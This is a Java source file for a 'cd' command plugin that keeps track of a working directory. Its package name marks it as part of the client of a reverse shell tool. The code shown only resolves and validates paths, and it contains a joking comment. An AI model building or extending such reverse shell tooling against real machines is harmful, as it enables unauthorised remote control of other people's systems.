package obs1d1anc1ph3r.reverseshell.client.plugins;

import java.io.File;
import java.io.IOException;

public class CDCommand implements CommandPlugin {

	private static String currentDir = System.getProperty("user.dir");

	@Override
	public String getCommandName() {
		return "cd"; //C Deez Nuts -- Me from the next day, made me laugh a bit, good job me
	}

	@Override
	public String execute(String[] args) {
		if (args.length == 0) {
			return "Error: No directory specified.";
		}
		String newDir = args[0];
		File dir = new File(newDir);
		if (!dir.isAbsolute()) {
			dir = new File(currentDir, newDir);
		}
		try {
			dir = dir.getCanonicalFile();
			if (dir.isDirectory()) {
				currentDir = dir.getAbsolutePath();
				return "Changed directory to: " + currentDir;
			} else {
				return "Error: Not a valid directory.";
			}
		} catch (IOException e) {
			return "Error: Unable to change directory - " + e.getMessage();
		}
	}

	public static String getCurrentDirectory() {
		return currentDir;
	}
}
